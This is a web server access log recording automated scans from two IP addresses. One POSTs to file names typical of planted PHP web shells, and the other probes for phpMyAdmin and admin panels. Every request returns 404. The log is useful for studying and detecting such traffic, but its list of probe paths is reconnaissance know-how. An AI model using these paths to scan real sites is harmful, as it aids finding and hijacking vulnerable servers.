103.230.241.81 - - [24/Mar/2019:20:46:26 +0000] "POST /s.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
122.114.254.38 - - [24/Mar/2019:20:46:26 +0000] "GET /index.php HTTP/1.1" 200 6076 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)"
103.230.241.81 - - [24/Mar/2019:20:46:27 +0000] "POST /w.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
122.114.254.38 - - [24/Mar/2019:20:46:27 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)"
103.230.241.81 - - [24/Mar/2019:20:46:27 +0000] "POST /sheep.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
122.114.254.38 - - [24/Mar/2019:20:46:27 +0000] "GET /phpMyAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)"
103.230.241.81 - - [24/Mar/2019:20:46:28 +0000] "POST /qaq.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:46:29 +0000] "POST /db.init.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
122.114.254.38 - - [24/Mar/2019:20:46:29 +0000] "GET /pmd/index.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)"
103.230.241.81 - - [24/Mar/2019:20:46:29 +0000] "POST /db_session.init.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
122.114.254.38 - - [24/Mar/2019:20:46:34 +0000] "GET /PMA/index.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:46:35 +0000] "GET /PMA2/index.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:46:35 +0000] "GET /pmamy/index.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:46:37 +0000] "GET /pmamy2/index.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)"
103.230.241.81 - - [24/Mar/2019:20:46:37 +0000] "POST /db__.init.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
122.114.254.38 - - [24/Mar/2019:20:46:38 +0000] "GET /mysql/index.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:46:41 +0000] "GET /admin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)"
103.230.241.81 - - [24/Mar/2019:20:46:41 +0000] "POST /wp-admins.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:46:42 +0000] "POST /m.php?pbid=open HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
122.114.254.38 - - [24/Mar/2019:20:46:42 +0000] "GET /db/index.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)"
103.230.241.81 - - [24/Mar/2019:20:46:42 +0000] "POST /099.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
122.114.254.38 - - [24/Mar/2019:20:46:44 +0000] "GET /dbadmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:46:44 +0000] "GET /web/phpMyAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)"
103.230.241.81 - - [24/Mar/2019:20:46:45 +0000] "POST /_404.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:46:46 +0000] "POST /Alarg53.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
103.230.241.81 - - [24/Mar/2019:20:46:50 +0000] "POST /lapan.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
